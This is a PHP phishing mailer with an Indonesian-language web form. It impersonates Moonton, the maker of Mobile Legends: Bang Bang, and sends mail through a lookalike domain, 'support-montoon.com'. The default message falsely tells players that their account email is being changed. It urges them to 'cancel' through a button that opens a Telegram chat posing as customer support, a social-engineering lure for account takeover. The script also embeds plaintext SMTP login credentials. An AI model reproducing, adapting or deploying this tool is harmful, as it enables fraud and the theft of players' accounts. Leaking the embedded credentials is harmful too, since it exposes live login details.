<?php
/* ========== KONFIGURASI WAJIB ========== */
$defaultName = "Mobile Legends: Bang Bang";
$defaultSubject = "Moonton Account - Change Email";
$defaultReplyTo = "donotreply@support-montoon.com";
$defaultBody = "
<p>Dear player,</p>
<p>We received a request to change your Moonton account that you want to change your Moonton.</p>
<p>Reason: Change Email Address</p>
<p style='margin-top: 20px;'>If this wasn't you, cancel immediately.</p>
";

date_default_timezone_set("Asia/Jakarta");

/* PHPMailer */
require __DIR__ . '/PHPMailer/src/Exception.php';
require __DIR__ . '/PHPMailer/src/PHPMailer.php';
require __DIR__ . '/PHPMailer/src/SMTP.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

function valid_email($e){ return filter_var($e, FILTER_VALIDATE_EMAIL); }

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $recipientEmail = trim($_POST['email'] ?? '');
    $subject = trim($_POST['subject'] ?? '') ?: $defaultSubject;
    $replyTo = trim($_POST['replyto'] ?? '') ?: $defaultReplyTo;
    $bodyHtml = trim($_POST['body'] ?? '') ?: $defaultBody;

    if (!valid_email($recipientEmail)) {
        echo "<script>alert('Email tidak valid!');window.location='';</script>";
        exit;
    }

    $link = "https://t.me/MobileLegendsTeamCS?text=" . rawurlencode("Cancel change email request [ $recipientEmail ]");

    $bodyHtmlFull = "
    <html>
    <body style='font-family: Arial; font-size: 14px; color: #000; padding: 20px;'>
        $bodyHtml
        <div style='text-align: center; margin: 30px 0;'>
            <a href='$link' style='display: inline-block; background-color: #ff4d4f; color: #fff; padding: 10px 60px; text-decoration: none; border-radius: 6px; font-weight: bold; font-size: 14px;'>Cancel Change Email</a>
        </div>
        <p>Please <a href='$link'>click here</a> if the button doesn’t respond. Link only active 24 hours.</p>
        <hr>
        <p style='color: #555;'>Shanghai Moonton Technology Co.,Ltd.</p>
    </body>
    </html>";

    try {
        $mail = new PHPMailer(true);
        $mail->isSMTP();
        $mail->Host       = 'mail.support-montoon.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'donotreply@support-montoon.com';
        $mail->Password   = 'Ncus628777#';
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
        $mail->Port       = 465;

        $mail->setFrom($replyTo, $defaultName);
        $mail->addReplyTo($replyTo, $defaultName);
        $mail->addAddress($recipientEmail);

        $mail->Subject = $subject;
        $mail->isHTML(true);
        $mail->Body = $bodyHtmlFull;

        $mail->send();

        echo "<script>alert('✔ Email berhasil dikirim ke $recipientEmail');window.location='';</script>";
        exit;
    } catch (Exception $e) {
        echo "<script>alert('✖ Gagal kirim: {$mail->ErrorInfo}');window.location='';</script>";
        exit;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Send Email</title>
    <style>
        body { font-family: Arial; max-width: 500px; margin: 30px auto; }
        input, textarea, button { width: 100%; padding: 8px; margin: 5px 0; }
        button { background: #4CAF50; color: #fff; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h2>Email Sender</h2>
    <form method="POST" onsubmit="document.getElementById('sendBtn').disabled=true; document.getElementById('sendBtn').textContent='Mengirim... ⏳';">
        <label>Email Tujuan*</label>
        <input type="email" name="email" required>

        <label>Subjek (opsional)</label>
        <input type="text" name="subject" placeholder="Default: Moonton Account - Change Email">

        <label>Reply-To (opsional)</label>
        <input type="email" name="replyto" placeholder="Default: donotreply@support-montoon.com">

        <label>Isi Pesan (opsional)</label>
        <textarea name="body" rows="5" placeholder="Isi pesan, atau biarkan kosong untuk default"></textarea>

        <button type="submit" id="sendBtn">KIRIM</button>
    </form>
</body>
</html>